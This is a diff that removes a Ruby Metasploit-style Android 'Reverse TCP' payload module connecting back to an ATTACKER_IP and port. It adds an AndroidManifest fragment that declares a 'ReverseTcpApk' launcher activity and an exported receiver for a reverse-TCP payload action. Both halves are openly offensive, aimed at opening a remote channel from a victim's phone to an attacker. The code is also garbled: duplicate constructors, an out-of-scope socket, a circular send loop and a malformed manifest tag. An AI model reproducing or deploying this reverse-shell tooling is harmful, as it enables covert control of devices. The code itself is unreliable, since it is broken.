@@ -1,78 +1,41 @@
-require 'msf/core'
+<uses-permission android:name="android.permission.INTERNET" />
+
+<application>
+
+<activity
+
+android:name=".ReverseTcpApk"
+
+android:label="@string/app_name">
+
+<intent-filter>
+
+<action android:name="android.intent.action.MAIN" />
+
+<category android:name="android.intent.category.LAUNCHER" />
+
+</intent-filter>
+
+</activity>
+
+</application>
 
 
 
-class Payload < Msf::Payload
+<!-- Add our reverse TCP payload -->
 
-def initialize(info = {})
+<receiver
 
-super(update_info(info,
+android:name=".PayloadReceiver"
 
-'Name' => 'Reverse TCP',
+android:enabled="true"
 
-'Description' => %q{
+android:exported="true">
 
-A reverse TCP payload that establishes a connection back to the attacker machine.
+<intent-filter>
 
-},
+<action.android.name = "com.example.REVERSE_TCP_PAYLOAD"/>
 
-'Author' => ['eli'],
+</intent-filter>
 
-'License' => MSF_LICENSE,
-
-'Platform' => [OS::Android],
-
-'Arch' => ARCH_ARMLE,
-
-))
-
-
-
-register_options(
-
-[
-
-Opt::String.new('ATTACKER_IP', [true, "Attacker's IP address"]),
-
-Opt::Int.new('ATTACKER_PORT', [true, "Attacker's port number"]),
-
-]
-)
-
-
-
-def initialize
-
-super
-
-
-
-@attacker_ip = datastore['ATTACKER_IP']
-
-@attacker_port = datastore['ATTACKER_PORT']
-
-
-
-# Establish reverse TCP connection
-
-sock = Rex::Socket.create_tcp_client(@attacker_ip, @attacker_port)
-
-print_status("Connected to attacker machine!")
-
-end
-
-
-
-def run
-
-while true do
-
-# Send data over the socket...
-
-send_data(sock.recv(1024))
-
-sleep 1
-
-end
-
-end
+</receiver>
